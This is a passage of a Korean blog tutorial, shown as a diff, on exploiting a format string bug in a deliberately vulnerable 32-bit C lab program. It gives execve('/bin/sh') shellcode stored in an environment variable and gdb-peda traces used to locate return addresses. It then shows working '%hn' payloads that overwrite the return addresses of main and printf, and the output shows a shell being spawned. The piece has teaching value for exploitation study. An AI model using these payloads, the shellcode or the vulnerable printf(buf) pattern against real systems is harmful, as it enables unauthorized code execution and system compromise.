@@ -451,11 +451,270 @@ AA+dummy+414133dc = 49 bytes
 
 먼저 RET를 공략해보자.
 
-내일 계속~
+입력 값이 길어지기 때문에 예제 소스코드를 다음처럼 변경하였다.
+
+```c++
+#include <stdio.h>
+#include <string.h>
+ 
+int main() {
+    char flag[] = "0";
+    char buf[1024];
+    fgets(buf, sizeof(buf), stdin);                          
+    printf(buf);
+    printf("%p\n",&flag);
+    if(!strcmp(flag,"1")) {
+        printf("Complete\n");
+    }
+}
+```
 
 ```
- r < <(python -c 'print "AA\xdc\xd5\xff\xff%134513861x%n"')
+root@shh0ya-virtual-machine:~/Pwn/FSB# export EGG=`python -c 'print "\x90"*40+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
 ```
+
+쉘 코드를 환경변수에 등록했고, 아래와 같이 환경변수의 주소를 구했다.
+
+```
+root@shh0ya-virtual-machine:~/Pwn/FSB# ./a.out 
+addr->0xffffd81e
+```
+
+메인함수에 bp를 설치하고 RET 주소를 확인하면 다음과 같다.
+
+```
+[----------------------------------registers-----------------------------------]
+EAX: 0xf7fb7dbc --> 0xffffd61c --> 0xffffd782 ("LC_PAPER=ko_KR.UTF-8")
+EBX: 0x0 
+ECX: 0xf36c5113 
+EDX: 0xffffd5a4 --> 0x0 
+ESI: 0xf7fb6000 --> 0x1b1db0 
+EDI: 0xf7fb6000 --> 0x1b1db0 
+EBP: 0x0 
+ESP: 0xffffd57c --> 0xf7e1c637 (<__libc_start_main+247>:	add    esp,0x10)
+EIP: 0x80484cb (<main>:	push   ebp)
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80484c2 <frame_dummy+34>:	add    esp,0x10
+   0x80484c5 <frame_dummy+37>:	leave  
+   0x80484c6 <frame_dummy+38>:	jmp    0x8048440 <register_tm_clones>
+=> 0x80484cb <main>:	push   ebp
+   0x80484cc <main+1>:	mov    ebp,esp
+   0x80484ce <main+3>:	sub    esp,0x404
+   0x80484d4 <main+9>:	mov    WORD PTR [ebp-0x2],0x30
+   0x80484da <main+15>:	mov    eax,ds:0x804a040
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd57c --> 0xf7e1c637 (<__libc_start_main+247>:	add    esp,0x10)
+0004| 0xffffd580 --> 0x1 
+0008| 0xffffd584 --> 0xffffd614 --> 0xffffd76f ("/root/Pwn/FSB/exam")
+0012| 0xffffd588 --> 0xffffd61c --> 0xffffd782 ("LC_PAPER=ko_KR.UTF-8")
+0016| 0xffffd58c --> 0x0 
+0020| 0xffffd590 --> 0x0 
+0024| 0xffffd594 --> 0x0 
+0028| 0xffffd598 --> 0xf7fb6000 --> 0x1b1db0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x080484cb in main ()
+```
+
+RET 주소는 `0xffffd57c` 로 확인된다. 환경변수의 주소도 알고 있고, 입력 버프의 길이도 알고 있으므로 이제 공격을 시도하면 된다. 그러나 한가지 문제가 존재한다.
+
+디버거와 실제 실행 시 메모리 주소가 다르다는 점이다.
+
+```
+gdb-peda$ r
+Starting program: /root/Pwn/FSB/exam 
+AA
+AA
+0xffffd576
+```
+
+디버거로 실행했을 때 `flag` 변수의 주소가 `0xffffd576`으로 출력된다. 그러나 쉘에서 그냥 실행하게 되면 다음과 같이 다른 메모리 주소를 확인할 수 있다.
+
+```
+root@shh0ya-virtual-machine:~/Pwn/FSB# ./exam
+AA
+AA
+0xffffd5a6
+```
+
+0x30만큼의 차이가 나는 것을 확인할 수 있다. 이는 gdb에서 사용하는 환경변수들이 존재하기 때문에 메모리 주소가 차이나는 것이다.
+
+결론적으로 쉘에서의 실행 결과와 같은 메모리의 주소를 확인하고 싶다면 gdb에서 내부적으로 사용하는 환경변수를 없애면 된다. 사용하는 환경변수를 확인하려면 다음과 같이 확인할 수 있다.
+
+```
+root@shh0ya-virtual-machine:~/Pwn/FSB# env -i gdb -q ./exam
+Reading symbols from ./exam...(no debugging symbols found)...done.
+(gdb) show env
+LINES=37
+COLUMNS=136
+```
+
+`LINES`와 `COLUMNS` 라는 환경변수를 사용하는 것으로 보인다.
+
+```
+root@shh0ya-virtual-machine:~/Pwn/FSB# ./exam
+AA
+AA
+0xffffd5a6	<= 쉘에서의 실행
+
+root@shh0ya-virtual-machine:~/Pwn/FSB# peda ./exam
+Reading symbols from ./exam...(no debugging symbols found)...done.
+gdb-peda$ unset env LINES
+gdb-peda$ unset env COLUMNS
+gdb-peda$ r
+Starting program: /root/Pwn/FSB/exam 
+AA
+AA
+0xffffd5a6	<= 환경변수를 제거함으로써 동일한 주소 획득
+```
+
+자 위와 같은 결과로 다시 RET를 확인해본다.
+
+```
+gdb-peda$ r
+Starting program: /root/Pwn/FSB/exam 
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xf7fb7dbc --> 0xffffd64c --> 0xffffd797 ("LC_PAPER=ko_KR.UTF-8")
+EBX: 0x0 
+ECX: 0x608bc5c4 
+EDX: 0xffffd5d4 --> 0x0 
+ESI: 0xf7fb6000 --> 0x1b1db0 
+EDI: 0xf7fb6000 --> 0x1b1db0 
+EBP: 0x0 
+ESP: 0xffffd5ac --> 0xf7e1c637 (<__libc_start_main+247>:	add    esp,0x10)
+EIP: 0x80484cb (<main>:	push   ebp)
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80484c2 <frame_dummy+34>:	add    esp,0x10
+   0x80484c5 <frame_dummy+37>:	leave  
+   0x80484c6 <frame_dummy+38>:	jmp    0x8048440 <register_tm_clones>
+=> 0x80484cb <main>:	push   ebp
+   0x80484cc <main+1>:	mov    ebp,esp
+   0x80484ce <main+3>:	sub    esp,0x404
+   0x80484d4 <main+9>:	mov    WORD PTR [ebp-0x2],0x30
+   0x80484da <main+15>:	mov    eax,ds:0x804a040
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd5ac --> 0xf7e1c637 (<__libc_start_main+247>:	add    esp,0x10)
+0004| 0xffffd5b0 --> 0x1 
+0008| 0xffffd5b4 --> 0xffffd644 --> 0xffffd784 ("/root/Pwn/FSB/exam")
+0012| 0xffffd5b8 --> 0xffffd64c --> 0xffffd797 ("LC_PAPER=ko_KR.UTF-8")
+0016| 0xffffd5bc --> 0x0 
+0020| 0xffffd5c0 --> 0x0 
+0024| 0xffffd5c4 --> 0x0 
+0028| 0xffffd5c8 --> 0xf7fb6000 --> 0x1b1db0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x080484cb in main ()
+```
+
+`0xffffd5ac` 로 되어있는데 위에서 구한 `0xffffd57c`와 정확히 0x30 차이가 난다.
+공격 코드를 짜본다.
+
+```
+root@shh0ya-virtual-machine:~/Pwn/FSB# (python -c 'print "AA"+"\xac\xd5\xff\xff"+"AAAA"+"\xae\xd5\xff\xff"+"%55312x%hn%10209x%hn"';cat)|./exam
+AA¬ֿÿAAAA®ֿÿ <공백> 4141e550 <공백> 41414141
+0xffffd5a6
+
+ls
+a.out  env.c  exam  exam.c  peda-session-dash.txt  peda-session-exam.txt
+pwd
+/root/Pwn/FSB
+```
+
+위와 같이 공격에 성공하여 쉘을 실행한 것을 볼 수 있다.
+
+```
+Dummy(AA) 2 bytes
+RET 하위주소(0xffffd5ac) 4 bytes
+Dummy(AAAA) 4 bytes
+RET 상위주소(0xffffd5ae) 4 bytes
+쉘 코드 하위주소(0xD810) 55312 bytes
+쉘 코드 상위주소(0x27E1) 10209 bytes
+```
+
+`printf` 호출 직전 다음과 같은 스택이 구성된다.
+
+```
+gdb-peda$ x/16wx $esp
+0xffffd170:	0xffffd176	0x4141e550	0xffffd5ac	0x41414141
+0xffffd180:	0xffffd5ae	0x33353525	0x25783231	0x31256e68
+0xffffd190:	0x39303230	0x6e682578	0x0000000a	0x00000000
+0xffffd1a0:	0x00000000	0x00000000	0x00000000	0x00000006
+```
+
+총 4개의 포맷스트링이 존재한다. (`%x %hn %x %hn`)
+첫 번째 %x를 만나면 55308 바이트만큼 공백을 출력하고 4바이트의 ESP+4 의 값을 출력한다.(55312)
+두 번째 %hn을 만나면 현재까지 출력한 길이를 ESP+8 위치에 있는 주소 안에 WORD 사이즈에 복사한다.
+
+즉 0xffffd5ac(RET)부터 2바이트에 Dummy(2) + RET 하위(4) + Dummy(4) + RET 상위(4) + 55312 값을 저장하게 된다. 이 값은 0xD812(55326) 으로 쉘코드의 하위 주소에 해당된다. 
+
+세번째 %x를 만나면 위와 같이 10205바이트만큼 공백 출력 후,  ESP+C 위치에 값을 4바이트 출력한다.(10209)
+네번째 %hn을 만나면 현재까지 출력한 길이를 ESP+10 위치에 있는 주소 안에 WORD 사이즈 복사한다.
+
+0xffffd5ae(RET+2)부터 2바이트까지 출력된 모든 길이를 저장하게 된다. 모두 더하면 65535 로 0xFFFF가 된다. 
+
+```
+gdb-peda$ x/16wx 0xffffd5ac
+0xffffd5ac:	0xffffd81e	0x00000001	0xffffd644	0xffffd64c
+0xffffd5bc:	0x00000000	0x00000000	0x00000000	0xf7fb6000
+0xffffd5cc:	0xf7ffdc04	0xf7ffd000	0x00000000	0xf7fb6000
+0xffffd5dc:	0xf7fb6000	0x00000000	0x19d758f0	0x25f7d6e0
+```
+
+위와 같이 RET의 값이 환경변수에 저장해두었던 쉘 코드의 주소로 변조된 것을 확인할 수 있다.
+
+## [+] Training 3
+
+이번엔 `printf` 함수의 RET를 변조하는 연습을 해보자.
+
+`printf` 함수 호출 직후, 스택은 아래와 같다.
+
+```
+gdb-peda$ x/16x $esp
+0xffffd16c:	0x08048500	0xffffd176	0x4141e550	0x0016000a
+0xffffd17c:	0x0016508c	0x0016508c	0x0000619c	0x0000619c
+0xffffd18c:	0x00000004	0x00000004	0x6474e551	0x00000000
+0xffffd19c:	0x00000000	0x00000000	0x00000000	0x00000000
+```
+
+ESP에는 RET 주소가 담겨있고, ESP+4에 버퍼 주소가 담겨있는 것을 확인할 수 있다.
+현재 ESP 주소의 값을 환경변수 `EGG` 의 주소로 변조해주면 될 것이다.
+
+마찬가지로 주소의 오차가 있을 수 있으므로 `unset LINES, COLUMNS` 명령으로 환경변수를 지워주고 메모리 주소를 다시 확인한다.
+
+```
+gdb-peda$ x/16x $esp
+0xffffd19c:	0x08048500	0xffffd1a6	0x4141e550	0x0016000a
+0xffffd1ac:	0x0016508c	0x0016508c	0x0000619c	0x0000619c
+0xffffd1bc:	0x00000004	0x00000004	0x6474e551	0x00000000
+0xffffd1cc:	0x00000000	0x00000000	0x00000000	0x00000000
+```
+
+RET 주소는 0xffffd19c 로 확인된다. 환경변수의 주소는 0xffffd81e 이다.
+
+```
+root@shh0ya-virtual-machine:~/Pwn/FSB# (python -c 'print "AA\x9c\xd1\xff\xff"+"AAAA\x9e\xd1\xff\xff"+"%55312x%hn"+"%10209x%hn"'; cat)|./exam
+
+...
+                                                                                                           41414141
+
+ls
+a.out  env.c  exam  exam.c  peda-session-dash.txt  peda-session-exam.txt
+
+pwd
+/root/Pwn/FSB
+```
+
+공격에 성공했다.
+
+## [+] Training 4
+
+이번엔 GOT Overwrite를 이용하여 공격을 해본다.
+저녁에 계소옥
 
 
 
